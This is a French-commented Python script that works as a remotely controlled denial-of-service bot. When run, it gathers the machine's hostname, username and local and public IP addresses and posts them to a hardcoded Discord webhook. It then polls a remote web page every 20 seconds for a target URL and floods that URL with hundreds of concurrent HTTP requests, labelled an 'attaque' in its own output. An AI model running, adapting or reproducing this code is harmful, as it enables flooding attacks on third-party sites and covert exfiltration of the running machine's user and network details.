import requests
from bs4 import BeautifulSoup
import time

url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"

headers = {
    "User-Agent": "...",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "fr,en;q=0.9",
    "Connection": "keep-alive",
}


webhook = "https://discordapp.com/api/webhooks/1442910596356898900/218BIA3FdUTa98-pVKYTwtW_FC8YjERHvw_DskmOTFGIQo07rfcXi-29U3kqhMa-K05c"

valeur = ""

import platform
import getpass
import socket

ordi = platform.uname()
hostname = socket.gethostname()

ip = requests.get("https://api.ipify.org").text
name = (
    f"Nom de l'ordinateur : {ordi.node}\n"
    f"Utilisateur actuel : {getpass.getuser()}\n"
    f"Nom de l'ordinateur : {ordi.node}\n"
    f"Adresse IP : {socket.gethostbyname(hostname)}\n"
    f"Adresse IP publique {ip}"
    )

requests.post(webhook, json={"content": name})

def envoyer():
    """Récupère la valeur de l'input toutes les 20 sec."""
    global valeur

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ = soup.find("input", {"id": "monTexte"})

        if champ:
            nouvelle_val = champ.get("value").strip()

            # Si la valeur a changé et n'est pas vide → action
            if nouvelle_val != "":
                valeur = nouvelle_val
                print("Nouvelle valeur détectée :", valeur)
                requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                ddos_attack()

            else:
                print("Aucune action. Valeur vide ou identique.")

    except Exception as e:
        print("Erreur :", e)


def loop_check():
    """Boucle infinie — vérifie toutes les 20 sec."""
    print("Démarrage du système de surveillance...")
    while True:
        envoyer()
        time.sleep(20)  # ← 20 secondes





from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp


async def async_ddos_attack():
    global valeur

    if valeur == "":
        print("pas possible")

    nombre_requetes = int(500)
    concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
    
    print(f"Démarrage de l'attaque avec {concurrence} connexions simultanées...")
    start_time = time.time()
    
 
    async def envoyer_requete_async(session, num):
        global valeur 
        try:
            async with session.get(valeur, timeout=5) as response:
                if num % 100 == 0 or num < 10:  
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status}")
                return True
        except Exception as e:
            if num % 100 == 0 or num < 10:
                print(f"Erreur requête {num} : {str(e)}")
            return False
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:
        # Créer les tâches
        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]
        
        batch_size = 1000
        successful = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            successful += sum(1 for r in results if r is True)
            
            # Afficher la progression
            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))
            print(f"Progression : {progress}% ({i + len(batch)}/{nombre_requetes})")
    
    duration = time.time() - start_time
    
    print(f"\nAttaque terminée en {duration:.2f} secondes")
    print(f"Requêtes réussies : {successful}/{nombre_requetes}")
    print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")

def ddos_attack():
    global valeur 

    try:
        asyncio.run(async_ddos_attack())
    except ImportError:
        print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")

        nombre_requetes = int(input("Combien de requêtes envoyer ? "))
        max_workers = min(200, nombre_requetes)
        
        start_time = time.time()
        success_count = 0
        
        def envoyer_requete(num):
            global valeur 
            try:
                response = requests.get(valeur, timeout=5)
                if num % 50 == 0 or num < 5:
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status_code}")
                return True
            except Exception as e:
                if num % 50 == 0 or num < 5:
                    print(f"Erreur requête {num} : {str(e)}")
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(envoyer_requete, i+1) for i in range(nombre_requetes)]
            
            for i, future in enumerate(futures):
                try:
                    if future.result():
                        success_count += 1
                except Exception:
                    pass
                
                if (i+1) % 100 == 0:
                    print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
        
        duration = time.time() - start_time
        print(f"\nAttaque terminée en {duration:.2f} secondes")
        print(f"Requêtes réussies : {success_count}/{nombre_requetes}")
        print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")



# Appel de la fonction
loop_check()
